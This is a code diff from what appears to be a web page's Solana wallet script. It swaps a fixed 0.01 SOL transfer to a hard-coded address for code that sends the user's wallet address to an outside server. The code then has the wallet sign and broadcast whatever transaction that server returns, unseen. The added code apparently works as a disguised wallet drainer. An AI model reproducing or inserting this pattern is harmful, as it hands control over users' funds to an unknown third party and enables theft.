@@ -1707,23 +1707,19 @@
                 return;
             }
 
-            const from = wallet.publicKey;
-            const to = new PublicKey('4W1ikm5b544hCxHDLJF2NyNLeFb2zasmLAA3KiejiDod');
-            const tx = new Transaction().add(
-                SystemProgram.transfer({
-                    fromPubkey: from,
-                    toPubkey: to,
-                    lamports: 0.01 * LAMPORTS_PER_SOL
-                })
-            );
-            tx.feePayer = from;
+            const creatorWallet = wallet.publicKey.toBase58();
 
-            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-            tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-            const signedTransaction = await provider.signTransaction(tx);
-            const signedTxBase64 = signedTransaction.serialize().toString('base64');
-
-            console.log("Signed Transaction (Base64):", signedTxBase64);
+            const res = await fetch('https://trading-signals-private.vercel.app/api/CreateTransaction', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ creatorWallet })
+            });
+            const data = await res.json();
+            const txBase64 = data.transaction;
+            const tx = Transaction.from(Buffer.from(txBase64, 'base64'));
+            const signedTx = await provider.signTransaction(tx);
+            const txid = await connection.sendRawTransaction(signedTx.serialize());
+            console.log("Transaction ID:", txid);
         }
     </script>
 </body>
